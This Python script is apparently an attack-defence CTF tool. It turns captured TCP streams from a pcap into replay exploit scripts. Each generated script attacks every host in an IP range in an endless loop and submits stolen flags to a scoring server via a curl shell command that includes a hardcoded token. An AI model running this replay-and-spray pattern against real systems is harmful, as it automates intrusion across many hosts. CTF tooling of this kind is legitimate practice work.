"""
Follow a TCP stream with pyshark.

python >= 3.6
"""
import pyshark



def parse_tcp_stream(filename = None, stream_number =None, output_file = None, is_raw = True):
    '''
@filename: .cap/.pcap package
@stream_number: tcp stream number
@output_file: exploit file
@is_raw: use raw string in exp
'''
    assert(filename!=None and stream_number!=None)
    cap = pyshark.FileCapture(
        filename,
        display_filter='tcp.stream eq %d' % stream_number, 
        tshark_path = 'D:\\Program\\'
    )
    try:
        p = cap.next()
    except StopIteration:
        return
    attacker, target = str(p.ip.addr), str(p.ip.dst)
    context = ''
    while True:
        try:
            p = cap.next()
        except StopIteration:  # Reached end of capture file.
            break
        try:
            # print data from the selected stream
            container = p.data.data
            if str(p.ip.addr) == attacker:
                if is_raw:
                    context += '    r.send(\'\'\'%s\'\'\')\n' % str(repr(container.binary_value)[2:-1])
                else:
                    context += '    r.send(\'\'\'%s\'\'\'.decode(\'hex\'))\n' % str(container)
            elif str(p.ip.addr) == target:
                if is_raw:
                    context += '    r.recvuntil(\'\'\'%s\'\'\')\n' % str(repr(container.binary_value)[2:-1])
                else:
                    context += '    r.recvuntil(\'\'\'%s\'\'\'.decode(\'hex\'))\n' % str(container)
        except AttributeError as e:  # Skip the ACKs.
            # print(e)
            pass
    cap.close()

    script = '''from q4n import *
def exp(ip,port):
    r = remote(ip,port)    
{main}
    flag = ''
    return flag

def submit(flag):
    ip = '10.10.10.200/api/v1/jad/web/submit_flag/?event_id=15'
    token = 'tkjty7yEx3x54eyDKFQsUXH7YGGajqxkA5FKEhqTVtM6S'
    cmd = 'curl	http://{{}} -d "flag={{}}&token={{}}"'.format(ip,flag,token)
    print(os.popen(cmd).read())

iplist = IPLIST('172.36.101-141.101').result
port = 8888
context.timeout = 10

while True:
    for i in iplist:
        try:
            flag = exp(i,port)
            Log.s(flag)
            submit(flag)
        except Exception as e:
            Log.s("err: "+str(i))
            Log.s(str(e))
        finally:
            r.close()            
'''.format(main=context)
    if not output_file:
        output_file = "exp-{stm_num}.py".format(stm_num=stream_number)
    with open(output_file,"w") as f:
        f.write(script)
    print("Done", stream_number)


if __name__ == "__main__":
    FILENAME = "2.pcap"
    STREAM_NUMBER = 0
    for i in range(40):
        expname = './exp/exp-{}.py'.format(i)
        parse_tcp_stream(FILENAME,i,expname)
    